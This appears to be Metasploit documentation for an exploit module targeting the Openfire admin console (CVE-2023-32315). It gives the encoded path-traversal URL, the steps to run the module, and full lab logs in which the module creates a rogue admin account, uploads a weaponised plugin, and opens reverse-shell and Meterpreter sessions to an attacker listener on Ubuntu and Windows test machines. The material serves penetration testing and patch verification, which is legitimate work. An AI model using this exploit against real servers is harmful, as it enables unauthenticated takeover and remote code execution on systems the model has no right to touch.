## Vulnerable Application
`Openfire's` administrative console, a web-based application, was found to be vulnerable to a path traversal attack
via the setup environment using the path `http://localhost:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/`.
Endpoints such as `log.jsp`, `user-groups.jsp` and `user-create.jsp` can be used to gain unauthorized admin access.
It allows an unauthenticated user to use the unauthenticated `Openfire` Setup Environment in an already configured
`Openfire` environment to access restricted pages in the `Openfire Admin Console` reserved for administrative users.

This module will use the vulnerability to create a new admin user that will be used to upload a `Openfire` management plugin
weaponized with a `Java` native payload that triggers an RCE.
The vulnerability affects all versions of `Openfire` that have been released since April 2015, starting with version `3.10.0`.
The problem has been patched in `Openfire` release `4.7.5` and `4.6.8`, and further improvements will be included
in the first version on the `4.8` branch, which is version `4.8.0`.

This module has been tested on:
- [ ] Ubuntu Linux 22.04.
* Openfire 3.10.1, 4.0.4, 4.1.0, 4.2.0, 4.3.0, 4.4.0, 4.5.0, 4.6.0. 4.7.0, 4.7.1, 4.7.3
* Java 7, 8, 17
- [ ] Windows Server 2019 Datacenter
* Openfire 4.7.3
* Java 20

**Instructions for an Openfire installation:**
Download Openfire releases [here](https://github.com/igniterealtime/Openfire/releases?page=1)
Follow installation instructions [here](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html)

## Verification Steps

- [ ] Start `msfconsole`
- [ ] `exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315`
- [ ] `set rhosts <ip-target>`
- [ ] `set rport <port>`
- [ ] `set target <0=Java Universal>`
- [ ] `exploit`
- [ ] you should get a `reverse shell` or `Meterpreter` session depending on the `payload` and `target` settings

```
msf6 exploit(multi/http/openfire_auth_bypass_rce_cve_2023_32315) > options

Module options (exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   ADMINNAME                      no        Openfire admin user name, (default: random)
   PLUGINAUTHOR                   no        Openfire plugin author, (default: random)
   PLUGINDESC                     no        Openfire plugin description, (default: random)
   PLUGINNAME                     no        Openfire plugin base name, (default: random)
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT         9090             yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /                yes       The base path to the web application
   VHOST                          no        HTTP server virtual host


Payload options (java/shell/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal
```

## Options

### TARGETURI
The uripath to the `Openfire Admin Console`. Default set to `/` which is the standard for `Openfire`.

### ADMINNAME
`Openfire` admin user name option to create a new admin user. User name will be randomized if not set.

### PLUGINAUTHOR
`Openfire` plugin author to set the name of the plugin author. Author name will be randomized if not set.

### PLUGINDESC
`Openfire` plugin description to update the description of the plugin. Description will be randomized if not set.

### PLUGINNAME
`Openfire` plugin name to set the plugin name. Plugin name will be randomized if not set.

## Scenarios
### Ubuntu  22.04 - Openfire 4.7.0 - java/meterpreter/reverse_tcp
```
msf6 exploit(multi/http/openfire_auth_bypass_rce_cve_2023_32315) > exploit

[*] Started reverse TCP handler on 192.168.201.10:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Openfire version is 4.7.0
[*] Grabbing the cookies.
[*] JSESSIONID=node010hllcuuhb19x13etracg8jjxk24.node0
[*] csrf=Lc9ZXFTo6H3bnC1
[*] Adding a new admin user.
[*] Logging in with admin user "jdajefap" and password "W3EozCK8Nx".
[*] Upload and execute plugin "U6zVD3dY" with payload "java/meterpreter/reverse_tcp".
[*] Sending stage (58851 bytes) to 192.168.201.59
[*] Meterpreter session 33 opened (192.168.201.10:4444 -> 192.168.201.59:60420) at 2023-07-08 10:33:16 +0000
[!] Plugin "U6zVD3dY" need manually clean-up via Openfire Admin console.
[!] Admin user "jdajefap" need manually clean-up via Openfire Admin console.

meterpreter > getuid
Server username: openfire
meterpreter > sysinfo
Computer        : cuckoo
OS              : Linux 5.15.0-76-generic (amd64)
Architecture    : x64
System Language : en_US
Meterpreter     : java/linux
meterpreter >
```
### Windows Server 2019 Datacenter - Openfire 4.7.3 - java/shell/reverse_tcp
```
msf6 exploit(multi/http/openfire_auth_bypass_rce_cve_2023_32315) > exploit

[*] Started reverse TCP handler on 192.168.201.10:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Openfire version is 4.7.4
[*] Grabbing the cookies.
[*] JSESSIONID=node01dr68xhv8giop14zogvh0ycnt13.node0
[*] csrf=mRz62R9hab6YAgt
[*] Adding a new admin user.
[*] Logging in with admin user "qkcvdmmevuvw" and password "tO0gWgDrM4".
[*] Upload and execute plugin "XZl3TKb1ayogynR" with payload "java/shell/reverse_tcp".
[*] Sending stage (2952 bytes) to 192.168.201.57
[!] Plugin "XZl3TKb1ayogynR" need manually clean-up via Openfire Admin console.
[!] Admin user "qkcvdmmevuvw" need manually clean-up via Openfire Admin console.
[*] Command shell session 32 opened (192.168.201.10:4444 -> 192.168.201.57:50171) at 2023-07-08 10:31:01 +0000


Shell Banner:
Microsoft Windows [Version 10.0.17763.107]
-----


C:\Program Files\Openfire\bin>systeminfo
systeminfo

Host Name:                 WIN-HHRQENPDSRS
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00430-00000-00000-AA500
Original Install Date:     1/23/2023, 4:51:06 AM
System Boot Time:          7/8/2023, 2:16:23 AM
System Manufacturer:       innotek GmbH
System Model:              VirtualBox
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 158 Stepping 13 GenuineIntel ~2306 Mhz
BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,048 MB
Available Physical Memory: 728 MB
Virtual Memory: Max Size:  3,469 MB
Virtual Memory: Available: 1,523 MB
Virtual Memory: In Use:    1,946 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: KB4464455
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Desktop Adapter
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     192.168.201.1
                                 IP address(es)
                                 [01]: 192.168.201.57
                                 [02]: fe80::b089:6587:7273:231e
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

C:\Program Files\Openfire\bin>
```

## Limitations
No limitations.
